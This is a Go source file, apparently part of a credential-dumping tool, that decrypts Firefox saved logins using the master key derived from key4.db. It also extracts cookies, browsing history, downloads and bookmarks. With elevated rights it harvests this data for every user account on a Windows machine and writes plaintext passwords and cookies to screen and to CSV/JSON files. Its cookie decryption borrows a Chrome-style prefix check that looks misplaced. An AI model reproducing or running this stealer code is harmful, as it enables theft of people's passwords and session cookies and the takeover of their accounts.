package browers

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	jsonpkg "encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// Firefox 相关常量
var (
	ErrProfilePathNotFound = errors.New("profile path not found")
)

// FirefoxProfile 表示一个 Firefox 配置文件
type FirefoxProfile struct {
	name        string
	profilePath string
	masterKey   []byte
	itemPaths   map[string]string
}

// GetFirefox 获取 Firefox 浏览器数据
func GetFirefox() (string, error) {
	var resultBuilder strings.Builder
	var name = []string{"Firefox", ""}
	BrowserName = name[0]
	if Format == "csv" || Format == "json" {
		PrintOut = false
	}

	if IsHighIntegrity() {
		// 高权限模式，可以访问所有用户
		userFolder := fmt.Sprintf("%s\\Users\\", os.Getenv("SystemDrive"))
		dirs, err := filepath.Glob(filepath.Join(userFolder, "*"))
		if err != nil {
			return "", err
		}

		for _, dir := range dirs {
			// 跳过系统目录
			if strings.Contains(dir, "All Users") || strings.Contains(dir, "Public") || strings.Contains(dir, "Default") {
				continue
			}

			// 获取用户名
			parts := strings.Split(dir, "\\")
			userName := parts[len(parts)-1]

			// 构建 Firefox 配置文件路径
			firefoxProfilePath := fmt.Sprintf("%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", dir)
			profiles, err := getFirefoxProfiles(firefoxProfilePath)
			if err != nil || len(profiles) == 0 {
				continue
			}

			browserInfo := fmt.Sprintf("========================== %s (%s) ==========================\n", name[0], userName)
			resultBuilder.WriteString(browserInfo)
			fmt.Printf("========================== %s (%s) ==========================\n", name[0], userName)

			for _, profile := range profiles {
				profileInfo := fmt.Sprintf("Profile: %s\n", profile.name)
				resultBuilder.WriteString(profileInfo)
				PrintSuccess(fmt.Sprintf("Profile: %s", profile.name), 1)

				// 提取登录数据
				if PathExists(profile.itemPaths["logins.json"]) && PathExists(profile.itemPaths["key4.db"]) {
					PrintVerbose(fmt.Sprintf("Get %s Login Data", name[0]))
					loginResult, _ := FirefoxLogins(profile, name[0])
					resultBuilder.WriteString(loginResult)
				}

				// 提取书签
				if PathExists(profile.itemPaths["places.sqlite"]) {
					PrintVerbose(fmt.Sprintf("Get %s Bookmarks", name[0]))
					bookmarkResult, _ := FirefoxBookmarks(profile, name[0])
					resultBuilder.WriteString(bookmarkResult)
				}

				// 提取Cookie
				if PathExists(profile.itemPaths["cookies.sqlite"]) && PathExists(profile.itemPaths["key4.db"]) {
					PrintVerbose(fmt.Sprintf("Get %s Cookie", name[0]))
					cookieResult, _ := FirefoxCookies(profile, name[0])
					resultBuilder.WriteString(cookieResult)
				}

				// 提取历史记录
				if PathExists(profile.itemPaths["places.sqlite"]) {
					PrintVerbose(fmt.Sprintf("Get %s History", name[0]))
					historyResult, _ := FirefoxHistory(profile, name[0])
					resultBuilder.WriteString(historyResult)
				}

				// 提取下载记录
				if PathExists(profile.itemPaths["places.sqlite"]) {
					PrintVerbose(fmt.Sprintf("Get %s Downloads", name[0]))
					downloadResult, _ := FirefoxDownloads(profile, name[0])
					resultBuilder.WriteString(downloadResult)
				}
			}
		}
	} else {
		// 普通权限模式，只能访问当前用户
		firefoxProfilePath := fmt.Sprintf("%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", os.Getenv("USERPROFILE"))
		profiles, err := getFirefoxProfiles(firefoxProfilePath)
		if err != nil || len(profiles) == 0 {
			return "", err
		}

		browserInfo := fmt.Sprintf("========================== %s (Current User) ==========================\n", name[0])
		resultBuilder.WriteString(browserInfo)
		fmt.Printf("========================== %s (Current User) ==========================\n", name[0])

		for _, profile := range profiles {
			profileInfo := fmt.Sprintf("Profile: %s\n", profile.name)
			resultBuilder.WriteString(profileInfo)
			PrintSuccess(fmt.Sprintf("Profile: %s", profile.name), 1)

			// 提取登录数据
			if PathExists(profile.itemPaths["logins.json"]) && PathExists(profile.itemPaths["key4.db"]) {
				PrintVerbose(fmt.Sprintf("Get %s Login Data", name[0]))
				loginResult, _ := FirefoxLogins(profile, name[0])
				resultBuilder.WriteString(loginResult)
			}

			// 提取书签
			if PathExists(profile.itemPaths["places.sqlite"]) {
				PrintVerbose(fmt.Sprintf("Get %s Bookmarks", name[0]))
				bookmarkResult, _ := FirefoxBookmarks(profile, name[0])
				resultBuilder.WriteString(bookmarkResult)
			}

			// 提取Cookie
			if PathExists(profile.itemPaths["cookies.sqlite"]) && PathExists(profile.itemPaths["key4.db"]) {
				PrintVerbose(fmt.Sprintf("Get %s Cookie", name[0]))
				cookieResult, _ := FirefoxCookies(profile, name[0])
				resultBuilder.WriteString(cookieResult)
			}

			// 提取历史记录
			if PathExists(profile.itemPaths["places.sqlite"]) {
				PrintVerbose(fmt.Sprintf("Get %s History", name[0]))
				historyResult, _ := FirefoxHistory(profile, name[0])
				resultBuilder.WriteString(historyResult)
			}

			// 提取下载记录
			if PathExists(profile.itemPaths["places.sqlite"]) {
				PrintVerbose(fmt.Sprintf("Get %s Downloads", name[0]))
				downloadResult, _ := FirefoxDownloads(profile, name[0])
				resultBuilder.WriteString(downloadResult)
			}
		}
	}

	return resultBuilder.String(), nil
}

// getFirefoxProfiles 获取所有 Firefox 配置文件
func getFirefoxProfiles(profilesPath string) ([]FirefoxProfile, error) {
	if !PathExists(profilesPath) {
		return nil, ErrProfilePathNotFound
	}

	var profiles []FirefoxProfile

	// 遍历配置文件目录
	err := filepath.Walk(profilesPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() && strings.Contains(info.Name(), ".default") {
			// 找到默认配置文件
			profile := FirefoxProfile{
				name:        info.Name(),
				profilePath: path,
				itemPaths:   make(map[string]string),
			}

			// 设置各种数据文件路径
			profile.itemPaths["key4.db"] = filepath.Join(path, "key4.db")
			profile.itemPaths["logins.json"] = filepath.Join(path, "logins.json")
			profile.itemPaths["cookies.sqlite"] = filepath.Join(path, "cookies.sqlite")
			profile.itemPaths["places.sqlite"] = filepath.Join(path, "places.sqlite")

			profiles = append(profiles, profile)
		}

		return nil
	})

	if err != nil {
		return nil, err
	}

	return profiles, nil
}

// GetFirefoxMasterKey 从 key4.db 获取 Firefox 主密钥
func GetFirefoxMasterKey(profile FirefoxProfile) ([]byte, error) {
	keyDbPath := profile.itemPaths["key4.db"]
	tempFilename, err := CreateTmpFile(keyDbPath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", keyDbPath), 1)
		return []byte(""), err
	}
	defer RemoveFile(tempFilename)

	// 使用 SQLiteHandler 打开数据库
	sqlDatabase, err := NewSQLiteHandler(tempFilename)
	if err != nil {
		return nil, fmt.Errorf("open key4.db error: %w", err)
	}
	defer sqlDatabase.Close()

	// 查询元数据
	var metaItem1, metaItem2 []byte

	// 使用 ReadTable 读取 metaData 表
	if !sqlDatabase.ReadTable("metaData") {
		return nil, fmt.Errorf("read metaData table error")
	}

	// 查找 password 记录
	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
		id := sqlDatabase.GetValue(i, "id")
		if id == "password" {
			item1Base64 := sqlDatabase.GetValue(i, "item1")
			item2Base64 := sqlDatabase.GetValue(i, "item2")

			var err error
			metaItem1, err = base64.StdEncoding.DecodeString(item1Base64)
			if err != nil {
				return nil, fmt.Errorf("decode item1 error: %w", err)
			}

			metaItem2, err = base64.StdEncoding.DecodeString(item2Base64)
			if err != nil {
				return nil, fmt.Errorf("decode item2 error: %w", err)
			}
			break
		}
	}

	if metaItem1 == nil || metaItem2 == nil {
		return nil, fmt.Errorf("password record not found in metaData")
	}

	// 查询 NSS 私钥
	var nssA11, nssA102 []byte

	// 使用 ReadTable 读取 nssPrivate 表
	if !sqlDatabase.ReadTable("nssPrivate") {
		return nil, fmt.Errorf("read nssPrivate table error")
	}

	// 获取第一行数据
	if sqlDatabase.GetRowCount() > 0 {
		a11Base64 := sqlDatabase.GetValue(0, "a11")
		a102Base64 := sqlDatabase.GetValue(0, "a102")

		var err error
		nssA11, err = base64.StdEncoding.DecodeString(a11Base64)
		if err != nil {
			return nil, fmt.Errorf("decode a11 error: %w", err)
		}

		nssA102, err = base64.StdEncoding.DecodeString(a102Base64)
		if err != nil {
			return nil, fmt.Errorf("decode a102 error: %w", err)
		}
	} else {
		return nil, fmt.Errorf("no records in nssPrivate table")
	}

	// 处理主密钥
	return processFirefoxMasterKey(metaItem1, metaItem2, nssA11, nssA102)
}

// processFirefoxMasterKey 处理 Firefox 主密钥
func processFirefoxMasterKey(metaItem1, metaItem2, nssA11, nssA102 []byte) ([]byte, error) {
	// 创建 ASN1PBE 对象
	metaPBE, err := NewASN1PBE(metaItem2)
	if err != nil {
		return nil, fmt.Errorf("error creating ASN1PBE from metaItem2: %w", err)
	}

	// 解密标志
	flag, err := metaPBE.Decrypt(metaItem1)
	if err != nil {
		return nil, fmt.Errorf("error decrypting master key: %w", err)
	}

	// 验证标志
	const passwordCheck = "password-check"
	if !bytes.Contains(flag, []byte(passwordCheck)) {
		return nil, errors.New("flag verification failed: password-check not found")
	}

	// 验证 nssA102
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	if !bytes.Equal(nssA102, keyLin) {
		return nil, errors.New("master key verification failed: nssA102 not equal to expected value")
	}

	// 创建 NSS ASN1PBE 对象
	nssA11PBE, err := NewASN1PBE(nssA11)
	if err != nil {
		return nil, fmt.Errorf("error creating ASN1PBE from nssA11: %w", err)
	}

	// 解密最终密钥
	finallyKey, err := nssA11PBE.Decrypt(metaItem1)
	if err != nil {
		return nil, fmt.Errorf("error decrypting final key: %w", err)
	}

	// 验证密钥长度
	if len(finallyKey) < 24 {
		return nil, errors.New("length of final key is less than 24 bytes")
	}

	return finallyKey[:24], nil
}

// FirefoxLogins 提取 Firefox 登录数据
func FirefoxLogins(profile FirefoxProfile, browserName string) (string, error) {
	var resultBuilder strings.Builder
	header := []string{"URL", "USERNAME", "PASSWORD", "CreateDate"}
	data := [][]string{}

	// 获取主密钥
	masterKey, err := GetFirefoxMasterKey(profile)
	if err != nil {
		PrintFail(fmt.Sprintf("获取主密钥失败: %v", err), 1)
		return "", err
	}

	// 读取登录数据
	loginsPath := profile.itemPaths["logins.json"]
	loginsData, err := ioutil.ReadFile(loginsPath)
	if err != nil {
		PrintFail(fmt.Sprintf("读取登录数据失败: %v", err), 1)
		return "", err
	}

	// 解析 JSON
	var loginsJSON map[string]interface{}
	if err := jsonpkg.Unmarshal(loginsData, &loginsJSON); err != nil {
		PrintFail(fmt.Sprintf("解析登录数据失败: %v", err), 1)
		return "", err
	}

	// 提取登录信息
	if logins, ok := loginsJSON["logins"].([]interface{}); ok {
		for _, login := range logins {
			loginMap, ok := login.(map[string]interface{})
			if !ok {
				continue
			}

			hostname := loginMap["hostname"].(string)
			username := loginMap["encryptedUsername"].(string)
			password := loginMap["encryptedPassword"].(string)
			timeCreated := int64(loginMap["timeCreated"].(float64))
			timeCreatedStr := TimeEpoch(timeCreated / 1000).String() // 转换为秒

			// 解密用户名
			decodedUsername, err := base64.StdEncoding.DecodeString(username)
			if err != nil {
				continue
			}
			decryptedUsername, err := decryptFirefoxData(decodedUsername, masterKey)
			if err != nil {
				continue
			}

			// 解密密码
			decodedPassword, err := base64.StdEncoding.DecodeString(password)
			if err != nil {
				continue
			}
			decryptedPassword, err := decryptFirefoxData(decodedPassword, masterKey)
			if err != nil {
				continue
			}

			loginInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
			loginInfo += fmt.Sprintf("URL: %s\n", hostname)
			loginInfo += fmt.Sprintf("USERNAME: %s\n", decryptedUsername)
			loginInfo += fmt.Sprintf("PASSWORD: %s\n", decryptedPassword)
			loginInfo += fmt.Sprintf("CreateDate: %s\n", timeCreatedStr)

			resultBuilder.WriteString(loginInfo)
			PrintNormal("    ---------------------------------------------------------")
			PrintSuccess(fmt.Sprintf("URL: %s", hostname), 1)
			PrintSuccess(fmt.Sprintf("USERNAME: %s", decryptedUsername), 1)
			PrintSuccess(fmt.Sprintf("PASSWORD: %s", decryptedPassword), 1)
			PrintSuccess(fmt.Sprintf("CreateDate: %s", timeCreatedStr), 1)

			data = append(data, []string{hostname, decryptedUsername, decryptedPassword, timeCreatedStr})
		}
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_login")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// decryptFirefoxData 解密 Firefox 加密数据
func decryptFirefoxData(encryptedData, key []byte) (string, error) {
	enPBE, err := NewASN1PBE(encryptedData)
	if err != nil {
		return "", err
	}
	user, err := enPBE.Decrypt(key)
	if err != nil {
		return "", err
	}

	return string(user), nil
}

// FirefoxCookies 提取 Firefox Cookie 数据
func FirefoxCookies(profile FirefoxProfile, browserName string) (string, error) {
	var resultBuilder strings.Builder
	cookiePath := profile.itemPaths["cookies.sqlite"]
	tempFilename, err := CreateTmpFile(cookiePath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", cookiePath), 1)
		return "", err
	}
	defer RemoveFile(tempFilename)

	// 获取主密钥
	masterKey, err := GetFirefoxMasterKey(profile)
	if err != nil {
		PrintFail(fmt.Sprintf("获取主密钥失败: %v", err), 1)
		return "", err
	}

	// 打开数据库
	sqlDatabase, err := NewSQLiteHandler(tempFilename)
	if err != nil {
		PrintFail(fmt.Sprintf("打开 Cookie 数据库失败: %v", err), 1)
		return "", err
	}
	defer sqlDatabase.Close()

	// 准备数据结构
	jsonHeader := []string{"domain", "expirationDate", "hostOnly", "httpOnly", "name", "path", "sameSite", "secure", "session", "storeId", "value"}
	jsonData := [][]string{}

	header := []string{"HOST", "COOKIE", "Path", "IsSecure", "Is_httponly", "HasExpire", "IsPersistent", "CreateDate", "ExpireDate", "AccessDate"}
	data := [][]string{}

	// 读取 moz_cookies 表
	if !sqlDatabase.ReadTable("moz_cookies") {
		PrintFail("没有找到 Cookie 数据", 1)
		return "", fmt.Errorf("no cookie data found")
	}

	// 处理每一行
	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
		host := sqlDatabase.GetValue(i, "host")
		name := sqlDatabase.GetValue(i, "name")
		value := sqlDatabase.GetValue(i, "value")
		path := sqlDatabase.GetValue(i, "path")

		isSecureStr := sqlDatabase.GetValue(i, "isSecure")
		isHttpOnlyStr := sqlDatabase.GetValue(i, "isHttpOnly")
		expiryStr := sqlDatabase.GetValue(i, "expiry")
		creationTimeStr := sqlDatabase.GetValue(i, "creationTime")
		lastAccessedStr := sqlDatabase.GetValue(i, "lastAccessed")

		// 转换时间戳
		expiry, _ := strconv.ParseInt(expiryStr, 10, 64)
		creationTime, _ := strconv.ParseInt(creationTimeStr, 10, 64)
		lastAccessed, _ := strconv.ParseInt(lastAccessedStr, 10, 64)

		// 转换为秒
		creationTimeStr = TimeEpoch(creationTime / 1000000).String()
		expiryTimeStr := TimeEpoch(expiry).String()
		lastAccessedStr = TimeEpoch(lastAccessed / 1000000).String()

		// 转换布尔值
		hasExpires := "true"
		isPersistent := "true"
		if expiry == 0 {
			hasExpires = "false"
			isPersistent = "false"
		}

		// 如果值是加密的，尝试解密
		if strings.HasPrefix(value, "v10") || strings.HasPrefix(value, "v11") {
			decodedValue, err := base64.StdEncoding.DecodeString(value)
			if err == nil {
				decryptedValue, err := decryptFirefoxData(decodedValue, masterKey)
				if err == nil {
					value = decryptedValue
				}
			}
		}

		cookieInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
		cookieInfo += fmt.Sprintf("HOST: %s\n", host)
		cookieInfo += fmt.Sprintf("COOKIE: %s=%s\n", name, value)
		cookieInfo += fmt.Sprintf("CreateDate: %s\n", creationTimeStr)
		cookieInfo += fmt.Sprintf("ExpireDate: %s\n", expiryTimeStr)
		cookieInfo += fmt.Sprintf("AccessDate: %s\n", lastAccessedStr)
		cookieInfo += fmt.Sprintf("Path: %s\n", path)

		resultBuilder.WriteString(cookieInfo)
		PrintNormal("    ---------------------------------------------------------")
		PrintSuccess(fmt.Sprintf("HOST: %s", host), 1)
		PrintSuccess(fmt.Sprintf("COOKIE: %s=%s", name, value), 1)
		PrintSuccess(fmt.Sprintf("CreateDate: %s", creationTimeStr), 1)
		PrintSuccess(fmt.Sprintf("ExpireDate: %s", expiryTimeStr), 1)
		PrintSuccess(fmt.Sprintf("AccessDate: %s", lastAccessedStr), 1)
		PrintSuccess(fmt.Sprintf("Path: %s", path), 1)

		cookie := fmt.Sprintf("%s=%s", name, value)

		jsonData = append(jsonData, []string{
			host, strconv.FormatInt(expiry, 10), "false", isHttpOnlyStr,
			name, path, "no_restriction", isSecureStr, "true", "0", value,
		})

		data = append(data, []string{
			host, cookie, path, isSecureStr, isHttpOnlyStr, hasExpires, isPersistent,
			creationTimeStr, expiryTimeStr, lastAccessedStr,
		})
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_cookie")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(jsonHeader, jsonData, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// FirefoxHistory 提取 Firefox 历史记录
func FirefoxHistory(profile FirefoxProfile, browserName string) (string, error) {
	var resultBuilder strings.Builder
	header := []string{"URL", "TITLE", "AccessDate"}
	data := [][]string{}

	placesPath := profile.itemPaths["places.sqlite"]
	tempFilename, err := CreateTmpFile(placesPath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", placesPath), 1)
		return "", err
	}
	defer RemoveFile(tempFilename)

	// 使用 SQLiteHandler 打开数据库
	sqlDatabase, err := NewSQLiteHandler(tempFilename)
	if err != nil {
		PrintFail(fmt.Sprintf("打开历史记录数据库失败: %v", err), 1)
		return "", err
	}
	defer sqlDatabase.Close()

	// 由于 SQLiteHandler 不支持复杂 JOIN 查询，我们需要分别读取两个表并在内存中关联数据

	// 首先读取 moz_places 表
	if !sqlDatabase.ReadTable("moz_places") {
		PrintFail("没有找到历史记录数据", 1)
		return "", fmt.Errorf("no history data found")
	}

	// 创建 ID 到 URL 和标题的映射
	placeMap := make(map[string]struct {
		url   string
		title string
	})

	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
		id := sqlDatabase.GetValue(i, "id")
		url := sqlDatabase.GetValue(i, "url")
		title := sqlDatabase.GetValue(i, "title")

		placeMap[id] = struct {
			url   string
			title string
		}{url, title}
	}

	// 然后读取 moz_historyvisits 表
	if !sqlDatabase.ReadTable("moz_historyvisits") {
		PrintFail("没有找到访问历史数据", 1)
		return "", fmt.Errorf("no visit history data found")
	}

	// 处理每一行
	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
		placeId := sqlDatabase.GetValue(i, "place_id")
		visitDateStr := sqlDatabase.GetValue(i, "visit_date")

		place, ok := placeMap[placeId]
		if !ok {
			continue
		}

		visitDate, _ := strconv.ParseInt(visitDateStr, 10, 64)
		visitDateStr = TimeEpoch(visitDate / 1000000).String()

		historyInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
		historyInfo += fmt.Sprintf("URL: %s\n", place.url)
		historyInfo += fmt.Sprintf("TITLE: %s\n", place.title)
		historyInfo += fmt.Sprintf("AccessDate: %s\n", visitDateStr)

		resultBuilder.WriteString(historyInfo)
		PrintNormal("    ---------------------------------------------------------")
		PrintSuccess(fmt.Sprintf("URL: %s", place.url), 1)
		PrintSuccess(fmt.Sprintf("TITLE: %s", place.title), 1)
		PrintSuccess(fmt.Sprintf("AccessDate: %s", visitDateStr), 1)

		data = append(data, []string{place.url, place.title, visitDateStr})
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_history")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// FirefoxDownloads 提取 Firefox 下载记录
func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error) {
	var resultBuilder strings.Builder
	header := []string{"URL", "PATH", "TIME"}
	data := [][]string{}

	placesPath := profile.itemPaths["places.sqlite"]
	tempFilename, err := CreateTmpFile(placesPath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", placesPath), 1)
		return "", err
	}
	defer RemoveFile(tempFilename)

	// 使用 SQLiteHandler 打开数据库
	sqlDatabase, err := NewSQLiteHandler(tempFilename)
	if err != nil {
		PrintFail(fmt.Sprintf("打开下载记录数据库失败: %v", err), 1)
		return "", err
	}
	defer sqlDatabase.Close()

	// 首先获取 downloads/destinationFileURI 的 anno_attribute_id
	var annoAttributeId string
	if !sqlDatabase.ReadTable("moz_anno_attributes") {
		PrintFail("没有找到属性数据", 1)
		return "", fmt.Errorf("no attribute data found")
	}

	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
		name := sqlDatabase.GetValue(i, "name")
		if name == "downloads/destinationFileURI" {
			annoAttributeId = sqlDatabase.GetValue(i, "id")
			break
		}
	}

	if annoAttributeId == "" {
		PrintFail("没有找到下载属性ID", 1)
		return "", fmt.Errorf("download attribute ID not found")
	}

	// 读取 moz_annos 表
	if !sqlDatabase.ReadTable("moz_annos") {
		PrintFail("没有找到注释数据", 1)
		return "", fmt.Errorf("no annotation data found")
	}

	// 创建 place_id 到 content 和 dateAdded 的映射
	annoMap := make(map[string]struct {
		content   string
		dateAdded string
	})

	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
		attrId := sqlDatabase.GetValue(i, "anno_attribute_id")
		if attrId == annoAttributeId {
			placeId := sqlDatabase.GetValue(i, "place_id")
			content := sqlDatabase.GetValue(i, "content")
			dateAdded := sqlDatabase.GetValue(i, "dateAdded")

			annoMap[placeId] = struct {
				content   string
				dateAdded string
			}{content, dateAdded}
		}
	}

	// 读取 moz_places 表获取 URL
	if !sqlDatabase.ReadTable("moz_places") {
		PrintFail("没有找到地址数据", 1)
		return "", fmt.Errorf("no places data found")
	}

	// 处理每一行
	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
		id := sqlDatabase.GetValue(i, "id")
		url := sqlDatabase.GetValue(i, "url")

		anno, ok := annoMap[id]
		if !ok {
			continue
		}

		// 处理文件路径
		path := strings.Replace(anno.content, "file:///", "", 1)
		path = strings.Replace(path, "/", "\\", -1)

		// 转换时间戳 (微秒转秒)
		dateAdded, _ := strconv.ParseInt(anno.dateAdded, 10, 64)
		dateAddedStr := TimeEpoch(dateAdded / 1000000).String()

		downloadInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
		downloadInfo += fmt.Sprintf("URL: %s\n", url)
		downloadInfo += fmt.Sprintf("PATH: %s\n", path)
		downloadInfo += fmt.Sprintf("AccessDate: %s\n", dateAddedStr)

		resultBuilder.WriteString(downloadInfo)
		PrintNormal("    ---------------------------------------------------------")
		PrintSuccess(fmt.Sprintf("URL: %s", url), 1)
		PrintSuccess(fmt.Sprintf("PATH: %s", path), 1)
		PrintSuccess(fmt.Sprintf("AccessDate: %s", dateAddedStr), 1)

		data = append(data, []string{url, path, dateAddedStr})
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_download")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// FirefoxBookmarks 提取 Firefox 书签
func FirefoxBookmarks(profile FirefoxProfile, browserName string) (string, error) {
	var resultBuilder strings.Builder
	header := []string{"NAME", "URL"}
	data := [][]string{}

	placesPath := profile.itemPaths["places.sqlite"]
	tempFilename, err := CreateTmpFile(placesPath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", placesPath), 1)
		return "", err
	}
	defer RemoveFile(tempFilename)

	// 打开数据库
	db, err := sql.Open("sqlite", tempFilename)
	if err != nil {
		PrintFail(fmt.Sprintf("打开书签数据库失败: %v", err), 1)
		return "", err
	}
	defer db.Close()

	// 查询书签
	rows, err := db.Query(`SELECT b.title, p.url, b.parent 
                          FROM moz_bookmarks b 
                          JOIN moz_places p ON b.fk = p.id 
                          WHERE b.type = 1 AND p.url NOT LIKE 'place:%'`)
	if err != nil {
		PrintFail(fmt.Sprintf("查询书签失败: %v", err), 1)
		return "", err
	}
	defer rows.Close()

	// 处理每一行
	for rows.Next() {
		var title, url string
		var parent int

		if err := rows.Scan(&title, &url, &parent); err != nil {
			continue
		}

		// 获取书签文件夹路径
		folderPath, err := getBookmarkFolderPath(db, parent)
		if err != nil {
			folderPath = "未知文件夹"
		}

		bookmarkInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
		bookmarkInfo += fmt.Sprintf("NAME: %s\n", title)
		bookmarkInfo += fmt.Sprintf("URL: %s\n", url)
		bookmarkInfo += fmt.Sprintf("FOLDER: %s\n", folderPath)

		resultBuilder.WriteString(bookmarkInfo)
		PrintNormal("    ---------------------------------------------------------")
		PrintSuccess(fmt.Sprintf("NAME: %s", title), 1)
		PrintSuccess(fmt.Sprintf("URL: %s", url), 1)
		PrintSuccess(fmt.Sprintf("FOLDER: %s", folderPath), 1)

		data = append(data, []string{title, url})
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_bookmark")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// getBookmarkFolderPath 获取书签文件夹路径
func getBookmarkFolderPath(db *sql.DB, parentID int) (string, error) {
	var path []string
	currentID := parentID

	for currentID > 0 {
		var title string
		var parent int
		err := db.QueryRow(`SELECT title, parent FROM moz_bookmarks WHERE id = ?`, currentID).Scan(&title, &parent)
		if err != nil {
			return "", err
		}

		if title != "" {
			path = append([]string{title}, path...)
		}
		currentID = parent
	}

	return strings.Join(path, " > "), nil
}
